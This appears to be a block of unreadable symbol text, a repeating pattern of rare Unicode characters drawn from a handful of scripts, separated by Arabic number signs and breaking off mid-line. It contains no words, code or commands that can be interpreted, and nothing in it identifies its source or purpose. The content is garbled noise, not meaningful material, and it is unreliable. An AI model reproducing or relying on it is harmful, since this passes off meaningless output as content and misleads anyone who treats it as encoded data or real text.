࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛𞋬